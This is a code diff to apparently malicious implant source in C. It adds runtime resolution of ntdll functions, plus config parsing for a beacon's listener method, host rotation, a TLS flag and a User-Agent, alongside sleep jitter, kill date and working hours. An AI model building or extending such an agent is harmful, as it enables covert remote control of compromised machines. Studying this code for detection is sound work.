@@ -126,6 +126,14 @@ INT init_agent(pAgent agent) {
     if (!agent->pRtlReAllocateHeap) {
         return -1;
     }
+	agent->pRtlRandomEx = (t_RtlRandomEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlRandomEx");
+	if (!agent->pRtlRandomEx) {
+		return -1;
+	}
+	agent->pNtGetTickCount = (t_NtGetTickCount)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtGetTickCount");
+    if (!agent->pNtGetTickCount) {
+        return -1;
+    }
 
     //obtain kernel32 apis
     agent->pGetComputerNameExA = (t_GetComputerNameExA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameExA");
@@ -210,6 +218,7 @@ INT ParseConfig(pAgent agent) {
     PARSER parser = { 0 };
     INT NumHosts = 0;
     PWCHAR Addr = NULL;
+	LPWSTR Buffer = NULL;
     INT Port = 0;
     INT Length = 0;
 
@@ -228,6 +237,9 @@ INT ParseConfig(pAgent agent) {
 	agent->config->SleepJitter = ParserReadInt32(&parser);
 	agent->config->KillDate = ParserReadInt64(&parser);
 	agent->config->WorkingHours = ParserReadInt32(&parser);
+    Buffer = ParserReadWString(&parser, &Length);
+	agent->config->listenerConfig.Method = agent->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
+	MemoryCopy(agent->config->listenerConfig.Method, Buffer, Length);
     agent->config->listenerConfig.HostRotation = ParserReadInt32(&parser);
     
     NumHosts = ParserReadInt32(&parser);
@@ -238,6 +250,13 @@ INT ParseConfig(pAgent agent) {
             AddHost(agent, Addr, Length, Port);
         }
     }
+	agent->config->listenerConfig.NumHosts = NumHosts;
+	agent->config->listenerConfig.CurrentHost = SelectHost(agent, agent->config->listenerConfig.HostRotation);
+
+	agent->config->listenerConfig.Secure = ParserReadInt32(&parser);
+    Buffer = ParserReadWString(&parser, &Length);
+    agent->config->listenerConfig.UserAgent = agent->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
+	MemoryCopy(agent->config->listenerConfig.UserAgent, Buffer, Length);
 
 
     return 0;
